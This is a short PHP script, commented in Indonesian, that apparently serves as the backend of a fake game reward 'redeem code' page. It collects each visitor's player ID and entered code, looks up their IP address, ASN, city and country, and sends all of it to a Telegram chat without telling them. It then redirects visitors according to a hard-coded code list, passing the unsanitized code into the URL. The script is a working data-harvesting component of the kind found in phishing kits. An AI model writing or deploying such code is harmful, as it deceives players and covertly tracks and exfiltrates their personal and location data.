<?php
include 'includes/config.php';
include 'includes/functions.php';

// Ambil data form
$player_id = $_POST['player_id'] ?? '';
$code = $_POST['code'] ?? '';

// Ambil data pengguna
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);

// Kirim data ke Telegram
$message = "Redeem Attempt:\n";
$message .= "Player ID: $player_id\n";
$message .= "Code: $code\n";
$message .= "IP: $ip\n";
$message .= "ASN: $asn\n";
$message .= "Location: $city, $country";
sendToTelegram($message);

// Validasi kode (contoh sederhana)
$valid_codes = ['NARUTO2023', 'SASUKE2023', 'KAKASHI2023'];
if (in_array(strtoupper($code), $valid_codes)) {
    header("Location: success.php?code=".$code);
} else {
    header("Location: failed.php");
}
exit();
?>
